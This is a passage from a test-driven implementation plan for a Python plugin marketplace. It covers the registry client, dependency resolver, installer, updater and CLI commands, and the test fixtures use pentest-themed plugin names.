            )
        if not bundle.exists():
            return VerifyResult(
                verified=False, error=f"Bundle not found: {bundle_path}"
            )

        result = verifier.verify(
            artifact.read_bytes(),
            bundle=bundle.read_bytes(),
            policy=identity,
        )
        return VerifyResult(verified=True, identity=expected_identity)

    except ImportError:
        return VerifyResult(
            verified=False,
            error="sigstore not installed. Install with: pip install opentools-plugin-core[sigstore]",
        )
    except Exception as e:
        return VerifyResult(verified=False, error=str(e))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_verify.py -x -v`
Expected: PASS (all 4 tests)

- [ ] **Step 5: Commit**

---

### Task 11: Registry Client

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/registry.py`
- Test: `packages/plugin-core/tests/test_registry.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_registry.py
"""Tests for registry client: catalog fetch, ETag, multi-registry, offline."""

import json

import pytest


@pytest.fixture
def sample_catalog_json():
    return json.dumps({
        "generated_at": "2026-04-15T12:00:00Z",
        "schema_version": "1.0.0",
        "plugins": [
            {
                "name": "wifi-hacking",
                "description": "WiFi tools",
                "author": "someone",
                "trust_tier": "verified",
                "domain": "pentest",
                "tags": ["wifi"],
                "latest_version": "1.0.0",
                "repo": "https://github.com/someone/x",
                "min_opentools_version": "0.3.0",
                "provides": {"skills": [], "recipes": [], "containers": []},
                "requires": {},
                "yanked_versions": [],
            },
            {
                "name": "cloud-recon",
                "description": "Cloud scanning",
                "author": "another",
                "trust_tier": "unverified",
                "domain": "cloud",
                "tags": ["aws", "cloud"],
                "latest_version": "0.5.0",
                "repo": "https://github.com/another/y",
                "min_opentools_version": "0.3.0",
                "provides": {"skills": [], "recipes": [], "containers": []},
                "requires": {},
                "yanked_versions": [],
            },
        ],
    })


class TestLocalCatalog:
    def test_load_from_path(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        catalog = client.load_cached_catalog()
        assert catalog is not None
        assert len(catalog.plugins) == 2

    def test_load_missing_returns_none(self, tmp_opentools_home):
        from opentools_plugin_core.registry import RegistryClient

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        catalog = client.load_cached_catalog()
        assert catalog is None


class TestSearch:
    def test_search_by_name(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        results = client.search("wifi")
        assert len(results) == 1
        assert results[0].name == "wifi-hacking"

    def test_search_by_tag(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        results = client.search("aws")
        assert len(results) == 1
        assert results[0].name == "cloud-recon"

    def test_search_by_domain(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        results = client.search("", domain="cloud")
        assert len(results) == 1

    def test_search_no_match(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        results = client.search("nonexistent-plugin-xyz")
        assert results == []


class TestLookup:
    def test_lookup_by_name(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        entry = client.lookup("wifi-hacking")
        assert entry is not None
        assert entry.name == "wifi-hacking"

    def test_lookup_nonexistent(self, tmp_opentools_home, sample_catalog_json):
        from opentools_plugin_core.registry import RegistryClient

        cache_path = tmp_opentools_home / "registry-cache" / "catalog.json"
        cache_path.write_text(sample_catalog_json)

        client = RegistryClient(cache_dir=tmp_opentools_home / "registry-cache")
        entry = client.lookup("nope")
        assert entry is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_registry.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/registry.py
"""Registry client: catalog fetch with ETag caching, multi-registry, offline."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Optional

from opentools_plugin_core.errors import RegistryError
from opentools_plugin_core.models import Catalog, CatalogEntry


class RegistryClient:
    """Client for fetching and searching the plugin catalog."""

    def __init__(
        self,
        cache_dir: Path,
        registries: list[dict] | None = None,
        catalog_ttl: int = 3600,
    ) -> None:
        self._cache_dir = Path(cache_dir)
        self._cache_dir.mkdir(parents=True, exist_ok=True)
        self._registries = registries or []
        self._catalog_ttl = catalog_ttl
        self._catalog: Catalog | None = None

    @property
    def _cache_path(self) -> Path:
        return self._cache_dir / "catalog.json"

    @property
    def _etag_path(self) -> Path:
        return self._cache_dir / "catalog.etag"

    # ── Cache ───────────────────────────────────────────────────────────

    def load_cached_catalog(self) -> Catalog | None:
        """Load catalog from local cache, or None if missing."""
        if not self._cache_path.exists():
            return None
        try:
            raw = json.loads(self._cache_path.read_text(encoding="utf-8"))
            self._catalog = Catalog(**raw)
            return self._catalog
        except Exception:
            return None

    def save_catalog(self, catalog: Catalog, etag: str = "") -> None:
        """Save catalog to local cache."""
        self._cache_path.write_text(
            catalog.model_dump_json(indent=2), encoding="utf-8"
        )
        if etag:
            self._etag_path.write_text(etag, encoding="utf-8")
        self._catalog = catalog

    # ── Fetch ───────────────────────────────────────────────────────────

    async def fetch_catalog(self, url: str, force: bool = False) -> Catalog:
        """Fetch catalog from a registry URL with ETag caching.

        Falls back to local cache if fetch fails.
        """
        import httpx

        headers: dict[str, str] = {}
        if not force and self._etag_path.exists():
            headers["If-None-Match"] = self._etag_path.read_text(encoding="utf-8").strip()

        try:
            async with httpx.AsyncClient() as client:
                resp = await client.get(url, headers=headers, timeout=30)

            if resp.status_code == 304:
                # Not modified, use cache
                cached = self.load_cached_catalog()
                if cached:
                    return cached
                raise RegistryError(
                    "304 Not Modified but no local cache",
                    hint="opentools plugin search --refresh",
                )

            resp.raise_for_status()
            raw = resp.json()
            catalog = Catalog(**raw)

            etag = resp.headers.get("ETag", "")
            self.save_catalog(catalog, etag)
            return catalog

        except httpx.HTTPError as e:
            # Try fallback to cached
            cached = self.load_cached_catalog()
            if cached:
                return cached
            raise RegistryError(
                "Catalog fetch failed",
                detail=str(e),
                hint="Check your network or add a local registry path",
            )

    # ── Search ──────────────────────────────────────────────────────────

    def _ensure_catalog(self) -> Catalog:
        if self._catalog is None:
            self._catalog = self.load_cached_catalog()
        if self._catalog is None:
            raise RegistryError(
                "No catalog available",
                hint="opentools plugin search --refresh",
            )
        return self._catalog

    def search(
        self,
        query: str,
        domain: str | None = None,
    ) -> list[CatalogEntry]:
        """Search the cached catalog by name, description, and tags."""
        catalog = self._ensure_catalog()
        query_lower = query.lower()
        results: list[CatalogEntry] = []

        for entry in catalog.plugins:
            # Domain filter
            if domain and entry.domain != domain:
                continue

            if not query:
                results.append(entry)
                continue

            # Match against name, description, tags
            searchable = (
                entry.name.lower()
                + " " + entry.description.lower()
                + " " + " ".join(t.lower() for t in entry.tags)
            )
            if query_lower in searchable:
                results.append(entry)

        return results

    def lookup(self, name: str) -> CatalogEntry | None:
        """Look up a specific plugin by exact name."""
        catalog = self._ensure_catalog()
        for entry in catalog.plugins:
            if entry.name == name:
                return entry
        return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_registry.py -x -v`
Expected: PASS (all 7 tests)

- [ ] **Step 5: Commit**

---

### Task 12: Dependency Resolver

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/resolver.py`
- Test: `packages/plugin-core/tests/test_resolver.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_resolver.py
"""Tests for dependency resolver: tree, conflicts, cycles."""

import pytest


def _make_catalog_entries(specs: dict[str, dict]) -> dict[str, dict]:
    """Helper: specs = {name: {requires_plugins: [{name, version}], provides: ...}}"""
    return specs


class TestResolver:
    def test_no_dependencies(self):
        from opentools_plugin_core.resolver import resolve

        catalog = {
            "wifi-hacking": {
                "requires_plugins": [],
                "provides_containers": ["aircrack-mcp"],
                "provides_skills": ["wifi-pentest"],
            }
        }
        plan = resolve("wifi-hacking", catalog, installed=set())
        assert plan == ["wifi-hacking"]

    def test_linear_dependency(self):
        from opentools_plugin_core.resolver import resolve

        catalog = {
            "wifi-hacking": {
                "requires_plugins": [{"name": "network-utils", "version": ">=1.0.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
            "network-utils": {
                "requires_plugins": [],
                "provides_containers": [],
                "provides_skills": [],
            },
        }
        plan = resolve("wifi-hacking", catalog, installed=set())
        assert plan.index("network-utils") < plan.index("wifi-hacking")

    def test_diamond_dependency(self):
        from opentools_plugin_core.resolver import resolve

        catalog = {
            "top": {
                "requires_plugins": [
                    {"name": "left", "version": ">=1.0"},
                    {"name": "right", "version": ">=1.0"},
                ],
                "provides_containers": [],
                "provides_skills": [],
            },
            "left": {
                "requires_plugins": [{"name": "base", "version": ">=1.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
            "right": {
                "requires_plugins": [{"name": "base", "version": ">=1.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
            "base": {
                "requires_plugins": [],
                "provides_containers": [],
                "provides_skills": [],
            },
        }
        plan = resolve("top", catalog, installed=set())
        assert "base" in plan
        assert plan.count("base") == 1  # No duplicates
        assert plan.index("base") < plan.index("left")
        assert plan.index("base") < plan.index("right")

    def test_circular_dependency_detected(self):
        from opentools_plugin_core.resolver import resolve
        from opentools_plugin_core.errors import DependencyResolveError

        catalog = {
            "a": {
                "requires_plugins": [{"name": "b", "version": ">=1.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
            "b": {
                "requires_plugins": [{"name": "a", "version": ">=1.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
        }
        with pytest.raises(DependencyResolveError, match="[Cc]ircular"):
            resolve("a", catalog, installed=set())

    def test_missing_dependency_error(self):
        from opentools_plugin_core.resolver import resolve
        from opentools_plugin_core.errors import DependencyResolveError

        catalog = {
            "needs-missing": {
                "requires_plugins": [{"name": "ghost", "version": ">=1.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
        }
        with pytest.raises(DependencyResolveError, match="ghost"):
            resolve("needs-missing", catalog, installed=set())

    def test_already_installed_skipped(self):
        from opentools_plugin_core.resolver import resolve

        catalog = {
            "wifi-hacking": {
                "requires_plugins": [{"name": "network-utils", "version": ">=1.0.0"}],
                "provides_containers": [],
                "provides_skills": [],
            },
            "network-utils": {
                "requires_plugins": [],
                "provides_containers": [],
                "provides_skills": [],
            },
        }
        plan = resolve("wifi-hacking", catalog, installed={"network-utils"})
        assert "network-utils" not in plan
        assert "wifi-hacking" in plan

    def test_conflict_detection(self):
        from opentools_plugin_core.resolver import detect_conflicts

        installed_provides = {
            "containers": {"nmap-mcp": "existing-plugin"},
        }
        new_provides = {
            "containers": ["nmap-mcp"],
            "skills": [],
            "recipes": [],
        }
        conflicts = detect_conflicts("new-plugin", new_provides, installed_provides)
        assert len(conflicts) >= 1
        assert any("nmap-mcp" in c for c in conflicts)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_resolver.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/resolver.py
"""Dependency tree resolution with conflict and cycle detection."""

from __future__ import annotations

from opentools_plugin_core.errors import DependencyResolveError


def resolve(
    target: str,
    catalog: dict[str, dict],
    installed: set[str],
) -> list[str]:
    """Resolve the install order for *target* and its dependencies.

    Returns a topologically sorted list (dependencies before dependents).
    Raises DependencyResolveError on cycles or missing deps.
    """
    order: list[str] = []
    visited: set[str] = set()
    in_stack: set[str] = set()

    def _visit(name: str) -> None:
        if name in installed:
            return
        if name in in_stack:
            raise DependencyResolveError(
                f"Circular dependency detected involving '{name}'",
                hint="Check the plugin's requires.plugins for cycles",
            )
        if name in visited:
            return

        if name not in catalog:
            raise DependencyResolveError(
                f"Plugin '{name}' not found in any registry",
                hint=f"opentools plugin search {name}",
            )

        in_stack.add(name)
        entry = catalog[name]

        for dep in entry.get("requires_plugins", []):
            dep_name = dep["name"] if isinstance(dep, dict) else dep
            _visit(dep_name)

        in_stack.discard(name)
        visited.add(name)
        order.append(name)

    _visit(target)
    return order


def detect_conflicts(
    new_plugin: str,
    new_provides: dict[str, list[str]],
    installed_provides: dict[str, dict[str, str]],
) -> list[str]:
    """Check if a new plugin's provided items conflict with installed ones.

    ``installed_provides`` maps category -> item_name -> owning_plugin.
    Returns list of conflict description strings.
    """
    conflicts: list[str] = []
    for category in ("containers", "skills", "recipes"):
        existing = installed_provides.get(category, {})
        for item in new_provides.get(category, []):
            if item in existing:
                owner = existing[item]
                conflicts.append(
                    f"{category[:-1]} '{item}' already provided by '{owner}'"
                )
    return conflicts
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_resolver.py -x -v`
Expected: PASS (all 7 tests)

- [ ] **Step 5: Commit**

---

### Task 13: Installer

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/installer.py`
- Test: `packages/plugin-core/tests/test_installer.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_installer.py
"""Tests for transactional install pipeline."""

import os
from pathlib import Path

import pytest


@pytest.fixture
def plugin_home(tmp_opentools_home):
    """Plugin home with all required subdirs."""
    return tmp_opentools_home


@pytest.fixture
def sample_plugin_source(tmp_path):
    """Create a minimal plugin source directory."""
    src = tmp_path / "source" / "test-plugin"
    src.mkdir(parents=True)
    manifest = src / "opentools-plugin.yaml"
    manifest.write_text(
        "name: test-plugin\n"
        "version: 1.0.0\n"
        "description: A test plugin\n"
        "author:\n  name: tester\n"
        "license: MIT\n"
        "min_opentools_version: '0.3.0'\n"
        "tags: [test]\n"
        "domain: pentest\n"
        "provides:\n"
        "  skills:\n"
        "    - path: skills/test-skill/SKILL.md\n"
        "  recipes: []\n"
        "  containers: []\n"
    )
    skill_dir = src / "skills" / "test-skill"
    skill_dir.mkdir(parents=True)
    (skill_dir / "SKILL.md").write_text("# Test Skill\nDo something safe.")
    return src


class TestStaging:
    def test_stage_creates_version_dir(self, plugin_home, sample_plugin_source):
        from opentools_plugin_core.installer import stage_plugin

        staged = stage_plugin(sample_plugin_source, plugin_home)
        assert staged.exists()
        assert (staged / "manifest.yaml").exists()
        assert (staged / "skills" / "test-skill" / "SKILL.md").exists()

    def test_stage_in_staging_dir(self, plugin_home, sample_plugin_source):
        from opentools_plugin_core.installer import stage_plugin

        staged = stage_plugin(sample_plugin_source, plugin_home)
        assert "staging" in str(staged)


class TestPromote:
    def test_promote_moves_to_plugins(self, plugin_home, sample_plugin_source):
        from opentools_plugin_core.installer import stage_plugin, promote_plugin

        staged = stage_plugin(sample_plugin_source, plugin_home)
        final = promote_plugin(staged, plugin_home, "test-plugin", "1.0.0")
        assert final.exists()
        assert final == plugin_home / "plugins" / "test-plugin" / "1.0.0"

    def test_promote_writes_active_pointer(self, plugin_home, sample_plugin_source):
        from opentools_plugin_core.installer import stage_plugin, promote_plugin

        staged = stage_plugin(sample_plugin_source, plugin_home)
        promote_plugin(staged, plugin_home, "test-plugin", "1.0.0")
        active_file = plugin_home / "plugins" / "test-plugin" / ".active"
        assert active_file.exists()
        assert active_file.read_text().strip() == "1.0.0"


class TestCleanup:
    def test_cleanup_removes_staging(self, plugin_home, sample_plugin_source):
        from opentools_plugin_core.installer import stage_plugin, cleanup_staging

        staged = stage_plugin(sample_plugin_source, plugin_home)
        assert staged.exists()
        cleanup_staging(staged)
        assert not staged.exists()

    def test_cleanup_stale_staging(self, plugin_home):
        from opentools_plugin_core.installer import cleanup_stale_staging

        stale = plugin_home / "staging" / "orphan-plugin" / "0.1.0"
        stale.mkdir(parents=True)
        (stale / "marker.txt").write_text("leftover")

        cleaned = cleanup_stale_staging(plugin_home)
        assert cleaned >= 1
        assert not stale.exists()


class TestActivePointer:
    def test_read_active_version(self, plugin_home):
        from opentools_plugin_core.installer import read_active_version

        plugin_dir = plugin_home / "plugins" / "my-plugin"
        plugin_dir.mkdir(parents=True)
        (plugin_dir / ".active").write_text("2.0.0")

        assert read_active_version(plugin_dir) == "2.0.0"

    def test_read_active_missing_returns_none(self, plugin_home):
        from opentools_plugin_core.installer import read_active_version

        plugin_dir = plugin_home / "plugins" / "no-plugin"
        plugin_dir.mkdir(parents=True)
        assert read_active_version(plugin_dir) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_installer.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/installer.py
"""Transactional install pipeline: stage, promote, cleanup."""

from __future__ import annotations

import os
import shutil
from pathlib import Path
from typing import Optional

from opentools_plugin_core.errors import PluginInstallError


def stage_plugin(source_dir: Path, opentools_home: Path) -> Path:
    """Copy plugin source into staging directory.

    Returns the path to the staged version directory.
    """
    # Read manifest to get name and version
    from ruamel.yaml import YAML

    yaml = YAML()
    manifest_path = source_dir / "opentools-plugin.yaml"
    if not manifest_path.exists():
        raise PluginInstallError(
            "No opentools-plugin.yaml found",
            hint=f"Ensure {source_dir} contains an opentools-plugin.yaml",
        )

    with manifest_path.open("r", encoding="utf-8") as f:
        manifest_data = yaml.load(f)

    name = manifest_data["name"]
    version = manifest_data["version"]

    staging = opentools_home / "staging" / name / version
    if staging.exists():
        shutil.rmtree(staging)
    staging.mkdir(parents=True)

    # Copy manifest
    shutil.copy2(manifest_path, staging / "manifest.yaml")

    # Copy skills, recipes, containers directories if they exist
    for subdir in ("skills", "recipes", "containers"):
        src = source_dir / subdir
        if src.is_dir():
            shutil.copytree(src, staging / subdir)

    # Copy changelog if present
    for extra in ("CHANGELOG.md", "README.md"):
        src = source_dir / extra
        if src.exists():
            shutil.copy2(src, staging / extra)

    return staging


def promote_plugin(
    staged_dir: Path,
    opentools_home: Path,
    name: str,
    version: str,
) -> Path:
    """Move staged plugin to final location and write .active pointer.

    Uses os.replace() for atomic pointer writes on both Linux and Windows.
    """
    final_dir = opentools_home / "plugins" / name / version
    final_dir.parent.mkdir(parents=True, exist_ok=True)

    if final_dir.exists():
        shutil.rmtree(final_dir)

    shutil.move(str(staged_dir), str(final_dir))

    # Atomic .active pointer write
    active_file = opentools_home / "plugins" / name / ".active"
    tmp_active = active_file.with_suffix(".tmp")
    tmp_active.write_text(version)
    os.replace(str(tmp_active), str(active_file))

    # Clean up staging parent if empty
    staging_parent = opentools_home / "staging" / name
    if staging_parent.exists() and not any(staging_parent.iterdir()):
        staging_parent.rmdir()

    return final_dir


def cleanup_staging(staged_dir: Path) -> None:
    """Remove a staging directory on install failure."""
    if staged_dir.exists():
        shutil.rmtree(staged_dir)
    # Clean parent if empty
    parent = staged_dir.parent
    if parent.exists() and not any(parent.iterdir()):
        parent.rmdir()


def cleanup_stale_staging(opentools_home: Path) -> int:
    """Remove any leftover staging directories from interrupted installs.

    Returns the number of directories cleaned.
    """
    staging = opentools_home / "staging"
    if not staging.exists():
        return 0

    count = 0
    for child in staging.iterdir():
        if child.is_dir():
            shutil.rmtree(child)
            count += 1
    return count


def read_active_version(plugin_dir: Path) -> Optional[str]:
    """Read the .active pointer file for a plugin directory.

    Returns the active version string or None if not found.
    """
    active = plugin_dir / ".active"
    if not active.exists():
        return None
    return active.read_text(encoding="utf-8").strip()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_installer.py -x -v`
Expected: PASS (all 7 tests)

- [ ] **Step 5: Commit**

---

### Task 14: Updater

**Files:**
- Create: `packages/plugin-core/src/opentools_plugin_core/updater.py`
- Test: `packages/plugin-core/tests/test_updater.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/plugin-core/tests/test_updater.py
"""Tests for update and rollback logic."""

from pathlib import Path

import pytest


@pytest.fixture
def installed_plugin(tmp_opentools_home):
    """Create a plugin with two installed versions."""
    plugin_dir = tmp_opentools_home / "plugins" / "test-plugin"
    v1 = plugin_dir / "1.0.0"
    v1.mkdir(parents=True)
    (v1 / "manifest.yaml").write_text("name: test-plugin\nversion: 1.0.0")

    v2 = plugin_dir / "2.0.0"
    v2.mkdir(parents=True)
    (v2 / "manifest.yaml").write_text("name: test-plugin\nversion: 2.0.0")

    (plugin_dir / ".active").write_text("2.0.0")
    return plugin_dir


class TestRollback:
    def test_rollback_to_previous(self, installed_plugin):
        from opentools_plugin_core.updater import rollback, get_available_versions

        versions = get_available_versions(installed_plugin)
        assert versions == ["1.0.0", "2.0.0"]

        rollback(installed_plugin, "1.0.0")
        assert (installed_plugin / ".active").read_text().strip() == "1.0.0"

    def test_rollback_nonexistent_version_raises(self, installed_plugin):
        from opentools_plugin_core.updater import rollback
        from opentools_plugin_core.errors import PluginError

        with pytest.raises(PluginError, match="not installed"):
            rollback(installed_plugin, "99.0.0")


class TestVersionListing:
    def test_available_versions_sorted(self, installed_plugin):
        from opentools_plugin_core.updater import get_available_versions

        versions = get_available_versions(installed_plugin)
        assert versions == ["1.0.0", "2.0.0"]

    def test_get_active_version(self, installed_plugin):
        from opentools_plugin_core.updater import get_active_version

        assert get_active_version(installed_plugin) == "2.0.0"


class TestPrune:
    def test_prune_keeps_active_and_n_previous(self, tmp_opentools_home):
        from opentools_plugin_core.updater import prune_old_versions

        plugin_dir = tmp_opentools_home / "plugins" / "many-versions"
        for v in ("1.0.0", "2.0.0", "3.0.0", "4.0.0"):
            d = plugin_dir / v
            d.mkdir(parents=True)
            (d / "manifest.yaml").write_text(f"version: {v}")
        (plugin_dir / ".active").write_text("4.0.0")

        removed = prune_old_versions(plugin_dir, keep=1)
        assert len(removed) == 2  # removes 1.0.0 and 2.0.0
        assert (plugin_dir / "4.0.0").exists()  # active kept
        assert (plugin_dir / "3.0.0").exists()  # 1 previous kept
        assert not (plugin_dir / "1.0.0").exists()
        assert not (plugin_dir / "2.0.0").exists()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/plugin-core && python -m pytest tests/test_updater.py -x`
Expected: FAIL with "ModuleNotFoundError"

- [ ] **Step 3: Write minimal implementation**

```python
# packages/plugin-core/src/opentools_plugin_core/updater.py
"""Plugin update, rollback, and version management."""

from __future__ import annotations

import os
import shutil
from pathlib import Path

from opentools_plugin_core.errors import PluginError


def get_available_versions(plugin_dir: Path) -> list[str]:
    """List installed version directories, sorted ascending."""
    versions = []
    for child in plugin_dir.iterdir():
        if child.is_dir() and child.name != ".active" and not child.name.startswith("."):
            versions.append(child.name)
    versions.sort()
    return versions


def get_active_version(plugin_dir: Path) -> str | None:
    """Read the .active pointer."""
    active = plugin_dir / ".active"
    if not active.exists():
        return None
    return active.read_text(encoding="utf-8").strip()


def rollback(plugin_dir: Path, target_version: str) -> None:
    """Repoint .active to a previous version.

    No file copying needed -- the old version directory is intact.
    """
    target_dir = plugin_dir / target_version
    if not target_dir.is_dir():
        raise PluginError(
            f"Version {target_version} not installed",
            hint=f"Available: {', '.join(get_available_versions(plugin_dir))}",
        )

    active_file = plugin_dir / ".active"
    tmp_active = active_file.with_suffix(".tmp")
    tmp_active.write_text(target_version)
    os.replace(str(tmp_active), str(active_file))


def prune_old_versions(plugin_dir: Path, keep: int = 1) -> list[str]:
    """Remove old version directories, keeping active + *keep* previous.

    Returns list of removed version strings.
    """
    active = get_active_version(plugin_dir)
    versions = get_available_versions(plugin_dir)

    if active and active in versions:
        versions.remove(active)

    # Keep the last `keep` versions (most recent by sort order)
    to_remove = versions[:-keep] if keep > 0 and len(versions) > keep else []

    removed: list[str] = []
    for ver in to_remove:
        ver_dir = plugin_dir / ver
        if ver_dir.is_dir():
            shutil.rmtree(ver_dir)
            removed.append(ver)

    return removed
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/plugin-core && python -m pytest tests/test_updater.py -x -v`
Expected: PASS (all 5 tests)

- [ ] **Step 5: Commit**

---

### Task 15: CLI Commands (Core)

**Files:**
- Create: `packages/cli/src/opentools/plugin_cli.py`
- Modify: `packages/cli/src/opentools/cli.py`
- Modify: `packages/cli/pyproject.toml`
- Test: `packages/cli/tests/test_plugin_cli.py`

- [ ] **Step 1: Write failing tests**

```python
# packages/cli/tests/test_plugin_cli.py
"""Tests for opentools plugin CLI commands."""

import json
from unittest.mock import patch, MagicMock

import pytest
from typer.testing import CliRunner

runner = CliRunner()


@pytest.fixture
def mock_home(tmp_path):
    """Provide a temporary opentools home."""
    home = tmp_path / ".opentools"
    (home / "plugins").mkdir(parents=True)
    (home / "staging").mkdir()
    (home / "cache").mkdir()
    (home / "registry-cache").mkdir()
    return home


class TestPluginList:
    def test_list_empty(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["list"])
        assert result.exit_code == 0
        assert "No plugins installed" in result.stdout

    def test_list_json_empty(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["list", "--json"])
        assert result.exit_code == 0
        data = json.loads(result.stdout)
        assert data == []


class TestPluginSearch:
    def test_search_no_catalog(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["search", "wifi"])
        assert result.exit_code == 1 or "No catalog" in result.stdout


class TestPluginInfo:
    def test_info_no_catalog(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["info", "wifi-hacking"])
        assert result.exit_code == 1 or "not found" in result.stdout.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py -x`
Expected: FAIL with "ModuleNotFoundError: No module named 'opentools.plugin_cli'"

- [ ] **Step 3: Write minimal implementation**

First, add `opentools-plugin-core` as a dependency:

```toml
# In packages/cli/pyproject.toml, add to dependencies:
#     "opentools-plugin-core>=0.1.0",
#     "filelock>=3.16",
```

Then register the sub-app in `packages/cli/src/opentools/cli.py`:

```python
# Add after other sub-app imports (around line 36):
from opentools.plugin_cli import plugin_app  # noqa: E402

# Add after other app.add_typer calls (around line 49):
app.add_typer(plugin_app)
```

Then the main CLI module:

```python
# packages/cli/src/opentools/plugin_cli.py
"""Typer sub-app for ``opentools plugin`` commands."""

from __future__ import annotations

import json as json_mod
from pathlib import Path
from typing import Optional

import typer
from rich.console import Console
from rich.table import Table

plugin_app = typer.Typer(name="plugin", help="Plugin marketplace")
console = Console(stderr=True)
out = Console()


def _opentools_home() -> Path:
    """Return ~/.opentools, creating if needed."""
    home = Path.home() / ".opentools"
    home.mkdir(exist_ok=True)
    (home / "plugins").mkdir(exist_ok=True)
    (home / "staging").mkdir(exist_ok=True)
    (home / "cache").mkdir(exist_ok=True)
    (home / "registry-cache").mkdir(exist_ok=True)
    return home


def _error(msg: str, hint: str = "") -> None:
    """Print error and exit."""
    console.print(f"[red]Error:[/red] {msg}")
    if hint:
        console.print(f"[dim]Hint:[/dim] {hint}")
    raise typer.Exit(1)


# ---------------------------------------------------------------------------
# Core commands: search, info, install, uninstall, list, update
# ---------------------------------------------------------------------------


@plugin_app.command("list")
def plugin_list(
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
    check_updates: bool = typer.Option(False, "--check-updates", help="Check for updates"),
    verify: bool = typer.Option(False, "--verify", help="Run integrity checks"),
    domain: Optional[str] = typer.Option(None, "--domain", help="Filter by domain"),
):
    """List installed plugins."""
    from opentools_plugin_core.index import PluginIndex

    home = _opentools_home()
    idx = PluginIndex(home / "plugins.db")
    plugins = idx.list_all()

    if json_output:
        out.print(json_mod.dumps(
            [p.model_dump(mode="json") for p in plugins], indent=2
        ))
        return

    if not plugins:
        out.print("No plugins installed.")
        return

    table = Table(title="Installed Plugins")
    table.add_column("Name")
    table.add_column("Version")
    table.add_column("Registry")
    table.add_column("Mode")
    table.add_column("Verified")
    for p in plugins:
        v_icon = "[green]yes[/green]" if p.signature_verified else "[yellow]no[/yellow]"
        table.add_row(p.name, p.version, p.registry, p.mode.value, v_icon)
    out.print(table)


@plugin_app.command("search")
def plugin_search(
    query: str = typer.Argument(..., help="Search query"),
    domain: Optional[str] = typer.Option(None, "--domain", help="Filter by domain"),
    registry_name: Optional[str] = typer.Option(None, "--registry", help="Pin to registry"),
    refresh: bool = typer.Option(False, "--refresh", help="Force catalog re-fetch"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Search the plugin registry."""
    from opentools_plugin_core.registry import RegistryClient
    from opentools_plugin_core.errors import RegistryError

    home = _opentools_home()
    client = RegistryClient(cache_dir=home / "registry-cache")

    try:
        results = client.search(query, domain=domain)
    except RegistryError as e:
